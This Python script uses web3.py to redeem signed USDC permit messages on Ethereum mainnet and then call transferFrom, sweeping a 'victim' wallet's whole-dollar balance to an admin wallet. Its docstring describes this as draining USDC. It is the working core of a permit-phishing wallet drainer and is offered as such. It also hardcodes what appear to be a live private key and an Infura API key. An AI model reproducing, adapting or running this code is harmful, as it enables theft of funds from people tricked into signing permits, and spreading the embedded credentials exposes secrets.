import os
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware
from eth_account import Account
import time

# ========================= CONFIGURATION =========================

RPC_URL = "https://mainnet.infura.io/v3/df3f921aa86a4c559eb527db6961ab74"

# STABLE ALTERNATIVE (uncomment if Infura is unstable)
# RPC_URL = "https://eth.drpc.org"

ADMIN_PRIVATE_KEY = "39b18988191943dc5b16c6ec5b0e5ff91eba1b355b7ec9b42d7b897f7c4663e8"

USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"

# ================================================================

# Initialize Web3
w3 = Web3(Web3.HTTPProvider(RPC_URL, request_kwargs={'timeout': 60}))

# Add middleware for some nodes (POA / ExtraData)
w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)

# USDC Contract ABI (Permit + balanceOf + transferFrom)
USDC_ABI = [
    {"constant": True, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"},
    {
        "inputs": [
            {"name": "owner", "type": "address"},
            {"name": "spender", "type": "address"},
            {"name": "value", "type": "uint256"},
            {"name": "deadline", "type": "uint256"},
            {"name": "v", "type": "uint8"},
            {"name": "r", "type": "bytes32"},
            {"name": "s", "type": "bytes32"}
        ],
        "name": "permit",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"name": "from", "type": "address"},
            {"name": "to", "type": "address"},
            {"name": "value", "type": "uint256"}
        ],
        "name": "transferFrom",
        "outputs": [{"name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

contract = w3.eth.contract(address=Web3.to_checksum_address(USDC_ADDRESS), abi=USDC_ABI)


def execute_usdc_transfer(victim_address: str, amount: float, deadline: int, v: int, r: str, s: str):
    """
    Executes Permit + transferFrom to drain USDC.
    Logic: Automatically extracts the WHOLE number of the balance, ignoring decimals.
    """
    try:
        admin_account = Account.from_key(ADMIN_PRIVATE_KEY)
        admin_addr = admin_account.address
        victim_addr = Web3.to_checksum_address(victim_address)

        # ====================== AUTO-CALCULATE AMOUNT ======================

        # Fetch actual raw balance from blockchain (e.g., 9,400,000 for 9.4 USDC)
        user_bal_raw = contract.functions.balanceOf(victim_addr).call()

        if user_bal_raw < 1_000_000:
            return None, f"USER_WALLET_ERROR: Balance is {user_bal_raw/1e6:.2f}. Need at least 1.00 USDC."

        # Logic: Take only the integer part (Floor Division)
        # Example: 9,400,000 // 1,000,000 = 9.
        # Then multiply back: 9 * 1,000,000 = 9,000,000 raw units.
        whole_units = user_bal_raw // 1_000_000
        amount_raw = whole_units * 1_000_000

        print(f"[DEBUG] Target: {victim_addr} | Balance: {user_bal_raw/1e6} | Extraction: {amount_raw/1e6}")

        # ====================== PRE-FLIGHT CHECKS ======================

        # Check admin ETH balance for gas
        admin_eth_balance = w3.eth.get_balance(admin_addr)
        if admin_eth_balance < w3.to_wei(0.005, 'ether'):
            return None, f"ADMIN_WALLET_ERROR: Low ETH ({admin_eth_balance / 1e18:.5f}). Need 0.005 ETH."

        # ====================== GAS SETTINGS ======================

        base_fee = w3.eth.get_block('latest')['baseFeePerGas']
        max_priority_fee = w3.eth.max_priority_fee or w3.to_wei(1.5, 'gwei')
        max_fee_per_gas = base_fee + (max_priority_fee * 2)

        # Standard Gas Limits for Mainnet
        permit_gas_limit = 100000
        transfer_gas_limit = 100000

        required_eth = (permit_gas_limit + transfer_gas_limit) * max_fee_per_gas
        if admin_eth_balance < required_eth:
            return None, f"ADMIN_WALLET_ERROR: Insufficient ETH. Need ~{w3.from_wei(required_eth, 'ether'):.5f}"

        # ====================== EXECUTION ======================

        current_nonce = w3.eth.get_transaction_count(admin_addr, 'pending')

        # 1. PERMIT Transaction
        permit_tx = contract.functions.permit(
            victim_addr,
            admin_addr,
            amount_raw,
            int(deadline),
            int(v),
            w3.to_bytes(hexstr=r),
            w3.to_bytes(hexstr=s)
        ).build_transaction({
            'from': admin_addr,
            'nonce': current_nonce,
            'gas': permit_gas_limit,
            'maxFeePerGas': max_fee_per_gas,
            'maxPriorityFeePerGas': max_priority_fee,
            'chainId': 1,
            'type': 2
        })

        signed_permit = w3.eth.account.sign_transaction(permit_tx, ADMIN_PRIVATE_KEY)
        permit_hash = w3.eth.send_raw_transaction(signed_permit.raw_transaction)
        print(f"[+] Permit sent: {permit_hash.hex()}")

        # Wait for propagation (10s for Mainnet stability)
        time.sleep(10)

        # 2. TRANSFERFROM Transaction
        transfer_tx = contract.functions.transferFrom(
            victim_addr,
            admin_addr,
            amount_raw
        ).build_transaction({
            'from': admin_addr,
            'nonce': current_nonce + 1,
            'gas': transfer_gas_limit,
            'maxFeePerGas': max_fee_per_gas,
            'maxPriorityFeePerGas': max_priority_fee,
            'chainId': 1,
            'type': 2
        })

        signed_transfer = w3.eth.account.sign_transaction(transfer_tx, ADMIN_PRIVATE_KEY)
        tx_hash = w3.eth.send_raw_transaction(signed_transfer.raw_transaction)

        return tx_hash.hex(), None

    except Exception as e:
        return None, f"EXECUTION_FAILED: {type(e).__name__}: {str(e)}"

def get_gas_info():
    try:
        base = w3.eth.get_block('latest')['baseFeePerGas']
        priority = w3.eth.max_priority_fee or w3.to_wei(1, 'gwei')
        return {
            "base_fee_gwei": w3.from_wei(base, 'gwei'),
            "priority_fee_gwei": w3.from_wei(priority, 'gwei'),
            "suggested_max_fee_gwei": w3.from_wei(base + priority * 2, 'gwei')
        }
    except:
        return {"error": "Failed to fetch gas info"}
